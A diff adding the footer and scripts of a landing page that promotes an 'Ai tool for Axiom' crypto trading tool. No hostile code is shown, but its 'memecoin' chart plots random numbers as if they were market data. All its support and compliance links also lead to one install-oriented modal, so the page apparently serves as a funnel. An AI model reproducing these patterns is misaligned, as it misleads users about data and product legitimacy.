+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										target="_blank"
+										rel="noopener"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.telegramLink"
+										onclick="window.openModal()"
+										>Telegram Support</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.emailLink"
+										onclick="window.openModal()"
+										>Email Support</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.billingLink"
+										onclick="window.openModal()"
+										>Billing Inquiries</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.complianceLink"
+										onclick="window.openModal()"
+										>Compliance</a
+									>
+								</li>
+								<li style="margin-bottom: 0.5rem">
+									<a
+										href="#"
+										style="
+											color: var(--text-secondary);
+											text-decoration: none;
+											transition: color 0.3s;
+										"
+										onmouseover="this.style.color='#10b981'"
+										onmouseout="this.style.color='#9ca3af'"
+										data-translate="footer.complianceLink"
+										onclick="window.openModal()"
+										>Marketing</a
+									>
+								</li>
+							</ul>
+						</div>
+
+						<div>
+							<div class="-logo-container">
+								<a
+									href="#"
+									target="_blank"
+									rel="noopener"
+									style="display: inline-block"
+									onclick="window.openModal()"
+								>
+									<img
+										src="Logo.PNG"
+										alt=""
+										class="-logo"
+										onmouseover="this.style.filter='brightness(1)'"
+										onmouseout="this.style.filter='brightness(0.8)'"
+									/>
+								</a>
+							</div>
+						</div>
+					</div>
+
+					<div
+						style="
+							border-top: 1px solid var(--border-color);
+							padding-top: 2rem;
+							text-align: center;
+						"
+					>
+						<p style="color: var(--text-secondary)">
+							&copy; 2026 Ai tool for Axiom. All rights reserved.
+							<a
+								href="#"
+								target="_blank"
+								style="color: var(--primary); text-decoration: none"
+								onclick="window.openModal()"
+								></a
+							>
+						</p>
+					</div>
+				</div>
+			</footer>
+		</div>
+
+		<script src="particles.js/2.0.0/particles.min.js"></script>
+		<script src="aos@2.3.1/dist/aos.js"></script>
+		<script src="npm/chart.js"></script>
+		<script>
+			function toggleVideoExpand() {
+				const wrapper = document.getElementById('videoWrapper');
+				const video = document.getElementById('installation-video');
+
+				if (wrapper.classList.contains('expanded')) {
+					wrapper.classList.remove('expanded');
+					wrapper.classList.remove('playing');
+					video.pause();
+					video.muted = true;
+					video.currentTime = 0;
+					video.removeAttribute('controls');
+				} else {
+					wrapper.classList.add('expanded');
+					wrapper.classList.add('playing');
+					video.muted = false;
+					video.currentTime = 0;
+					video.setAttribute('controls', 'controls');
+					video.play();
+				}
+			}
+
+			document.addEventListener('keydown', function (e) {
+				if (e.key === 'Escape') {
+					const wrapper = document.getElementById('videoWrapper');
+					if (wrapper && wrapper.classList.contains('expanded')) {
+						toggleVideoExpand();
+					}
+				}
+			});
+		</script>
+		<script>
+			particlesJS('particles-js', {
+				particles: {
+					number: { value: 80, density: { enable: true, value_area: 800 } },
+					color: { value: '#10b981' },
+					shape: { type: 'circle' },
+					opacity: { value: 0.3, random: true },
+					size: { value: 3, random: true },
+					line_linked: {
+						enable: true,
+						distance: 150,
+						color: '#10b981',
+						opacity: 0.2,
+						width: 1,
+					},
+					move: {
+						enable: true,
+						speed: 2,
+						direction: 'none',
+						random: false,
+						straight: false,
+						out_mode: 'out',
+					},
+				},
+				interactivity: {
+					detect_on: 'canvas',
+					events: {
+						onhover: { enable: true, mode: 'grab' },
+						onclick: { enable: true, mode: 'push' },
+					},
+					modes: {
+						grab: { distance: 140, line_linked: { opacity: 0.5 } },
+						push: { particles_nb: 4 },
+					},
+				},
+				retina_detect: true,
+			});
+
+			AOS.init({
+				duration: 1000,
+				once: true,
+				offset: 100,
+			});
+
+			window.addEventListener('scroll', () => {
+				const header = document.querySelector('header');
+				if (window.scrollY > 50) {
+					header.classList.add('scrolled');
+				} else {
+					header.classList.remove('scrolled');
+				}
+			});
+
+			function initMemecoinChart() {
+				const ctx = document.getElementById('memecoin-chart');
+				if (!ctx) return;
+
+				new Chart(ctx, {
+					type: 'line',
+					data: {
+						labels: Array(30).fill(''),
+						datasets: [
+							{
+								data: generateRandomData(30, 50, 150),
+								borderColor: '#10b981',
+								borderWidth: 2,
+								tension: 0.4,
+								fill: false,
+								pointRadius: 0,
+							},
+						],
+					},
+					options: {
+						responsive: true,
+						maintainAspectRatio: false,
+						plugins: { legend: { display: false } },
+						scales: {
+							x: { display: false },
+							y: {
+								display: true,
+								grid: { color: 'rgba(255, 255, 255, 0.05)' },
+								ticks: { color: '#9ca3af' },
+							},
+						},
+					},
+				});
+			}
+
+			function generateRandomData(count, min, max) {
+				const data = [];
+				let current = (min + max) / 2;
+				for (let i = 0; i < count; i++) {
+					current += (Math.random() - 0.5) * (max - min) * 0.1;
+					current = Math.max(min, Math.min(max, current));
+					data.push(current);
+				}
+				return data;
+			}
+
+			function toggleTrigger(element) {
+				element.classList.toggle('active');
+			}
+
+			function checkMobileActivation(event) {
+				if (window.innerWidth <= 768) {
+					event.preventDefault();
+					document.getElementById('mobileModal').classList.add('active');
+				} else {
+					event.preventDefault();
+					document.getElementById('desktopModal').classList.add('active');
+				}
+			}
+
+			function closeDesktopModal() {
+				document.getElementById('desktopModal').classList.remove('active');
+			}
+
+			function closeMobileModal() {
+				document.getElementById('mobileModal').classList.remove('active');
+			}
+
+			document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+				anchor.addEventListener('click', function (e) {
+					const href = this.getAttribute('href');
+					if (href && href.length > 1) {
+						e.preventDefault();
+						const target = document.querySelector(href);
+						if (target) {
+							target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+						}
+					}
+				});
+			});
+		</script>
+
+		<script>
+			(function () {
+				if (sessionStorage.getItem('tracked')) return;
+
+				fetch('/api/track', {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+				})
+					.then(() => sessionStorage.setItem('tracked', '1'))
+					.catch(err => console.error('Tracking error:', err));
+			})();
+		</script>
+
+		<nav class="nav-links">
+			<button onclick="scrollToAbout()">About</button>
+			<button onclick="scrollToWhy()">Why Ai tool for Axiom</button>
+			<button onclick="scrollToInstallation()">Installation</button>
+			<button onclick="doNothing()">X</button>
+			<button onclick="doNothing()"></button>
+			<button onclick="openAxiom()">axiom.trade</button>
+		</nav>
+
+		<style>
+			html {
+				scroll-behavior: smooth;
+			}
+		</style>
+
+		<script>
+			function smoothScrollTo(el) {
+				if (!el) return;
+				el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+			}
+
+			function findSmartTradingSection() {
+				const candidates = [
+					'#features',
+					'#smart-trading',
+					'#smartTrading',
+					'[data-section="features"]',
+					'.smart-trading',
+					'#about .feature-card',
+				];
+				for (const sel of candidates) {
+					const el = document.querySelector(sel);
+					if (el) return el.closest('section') || el;
+				}
+				const heading = [
+					...document.querySelectorAll('h1,h2,h3,.section-title'),
+				].find(h =>
+					/smart\s*trade|smart\s*trading|умн\w*\s*торгов/i.test(h.textContent)
+				);
+				return heading ? heading.closest('section') || heading : null;
+			}
+
+			function findSection() {
+				const direct = document.querySelector('#');
+				if (direct) return direct.closest('section') || direct;
+				const alt = [
+					...[
+						...document.querySelectorAll(
+							'[data-section=""], .'
+						),
+					],
+				].find(Boolean);
+				if (alt) return alt.closest('section') || alt;
+				const phrases = [
+					"We're not just any coin tracker",
+					'Мы не просто трекер монет',
+				];
+				for (const n of document.querySelectorAll(
+					'h1,h2,h3,h4,p,div,section,.section-title'
+				)) {
+					const text = (n.textContent || '').trim();
+					if (text && phrases.some(ph => text.includes(ph)))
+						return n.closest('section') || n;
+				}
+				return null;
+			}
+
+			function scrollToAbout() {
+				smoothScrollTo(document.querySelector('#about'));
+			}
+			function scrollToWhy() {
+				smoothScrollTo(findSmartTradingSection());
+			}
+			function scrollToInstallation() {
+				smoothScrollTo(document.querySelector('#installation'));
+			}
+			function scrollTo() {
+				smoothScrollTo(findSection());
+			}
+
+			function openAxiom() {
+				window.open('https://axiom.trade', '_blank', 'noopener');
+			}
+
+			function closeMobileModal() {
+				const m = document.getElementById('mobileModal');
+				if (m) m.classList.remove('active');
+			}
+			function closeDesktopModal() {
+				const m = document.getElementById('desktopModal');
+				if (m) m.classList.remove('active');
+			}
+
+			function rewireGetStarted() {
+				document
+					.querySelectorAll('a[data-translate="nav.getStarted"]')
+					.forEach(a => {
+						a.removeAttribute('target');
+						a.onclick = e => {
+							e.preventDefault();
+							scrollToInstallation();
+						};
+					});
+			}
+
+			function styleNeutralLink(a) {
+				a.style.color = 'inherit';
+				a.style.textDecoration = 'none';
+			}
+
+			function wireXAndLinks() {
+				document.querySelectorAll('a,button').forEach(el => {
+					const text = ((el.textContent || '').trim() || '').toLowerCase();
+					const label = (
+						(el.getAttribute('aria-label') || '').trim() || ''
+					).toLowerCase();
+
+					if (text === 'x' || label === 'x') {
+						if (el.tagName.toLowerCase() === 'a') {
+							el.href = 'https://x.com/TimCraftrsa';
+							el.target = '_blank';
+							el.rel = 'noopener';
+						}
+						el.onclick = e => {
+							e.preventDefault();
+							window.open('https://x.com/TimCraftrsa', '_blank', 'noopener');
+						};
+						styleNeutralLink(el);
+						return;
+					}
+
+					if (text === '' || label === '') {
+						if (el.tagName.toLowerCase() === 'a') {
+							el.removeAttribute('href');
+							el.removeAttribute('target');
+						}
+						el.onclick = e => {
+							e.preventDefault();
+							scrollTo();
+						};
+						styleNeutralLink(el);
+						return;
+					}
+				});
+			}
+
+			function removeGhostLinks() {
+				const isInHeader = el => !!el.closest('header, nav');
+				document
+					.querySelectorAll(
+						'a[onclick*="scrollToAbout"],a[onclick*="scrollToWhy"],a[onclick*="scrollToInstallation"],a[onclick*="openAxiom"],a[onclick*="doNothing"]'
+					)
+					.forEach(a => {
+						if (!isInHeader(a)) a.remove();
+					});
+				document.querySelectorAll('a').forEach(a => {
+					const t = (a.textContent || '').trim().toLowerCase();
+					if (!isInHeader(a) && t === 'axiom.trade') a.remove();
+				});
+			}
+
+			// document.addEventListener('DOMContentLoaded', () => {
+			// 	rewireGetStarted();
+			// 	wireXAndLinks();
+			// 	removeGhostLinks();
+			// });
+		</script>
+	</body>
+</html>
